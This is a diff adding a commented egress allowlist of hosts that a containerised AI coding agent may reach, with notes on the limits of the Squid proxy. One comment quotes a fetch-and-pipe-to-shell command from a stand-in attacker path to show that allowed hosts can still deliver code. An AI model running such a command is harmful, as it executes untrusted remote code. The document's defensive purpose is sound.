@@ -1,0 +1,44 @@
+# Domains the cozy container may reach. Everything else is refused.
+#
+# One per line. A bare name matches that host exactly. A leading dot matches the
+# domain and all its subdomains — prefer exact hosts, and reach for a dot only
+# when you mean to open the whole tree.
+#
+# After editing: docker compose restart egress
+#
+# What this list bounds is WHICH HOSTS the agent can reach — nothing more.
+#
+# Not a code filter. Squid sees only the hostname in the CONNECT and never the
+# path or the body, so an allowed host that lets anyone publish carries anything
+# through: `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes
+# this list cleanly. github.com, the githubusercontent hosts and ghcr.io are all
+# open publishing platforms. Blocking code by content would need TLS
+# interception, which this deliberately does not do.
+#
+# Not containment either. github.com carries `git push`, so with any credential
+# in your workspace it is a full outbound channel — a much smaller list would be
+# needed if the goal were keeping your data in.
+
+# Claude Code: the API it talks to, plus the two hosts `claude install` and
+# `claude update` fetch from (claude.ai/install.sh redirects to downloads).
+# Its telemetry host (datadoghq.com) is deliberately absent and nothing breaks.
+api.anthropic.com
+claude.ai
+downloads.claude.ai
+
+# git over https, gh, and the skills/vendor clones. release-assets is where
+# GitHub serves release binaries — without it ensure-nu.sh cannot fall back to
+# the pinned nushell. github-cloud is where git-lfs objects actually live.
+github.com
+api.github.com
+raw.githubusercontent.com
+release-assets.githubusercontent.com
+github-cloud.githubusercontent.com
+
+# Homebrew, for installing tools at runtime — these three are exactly the bottle
+# install chain (formula index → registry token + manifest → blob). A formula
+# with no Linux bottle builds from source and will fail on some upstream URL.
+# Drop these if the image's toolset is enough; the build already has everything.
+formulae.brew.sh
+ghcr.io
+pkg-containers.githubusercontent.com
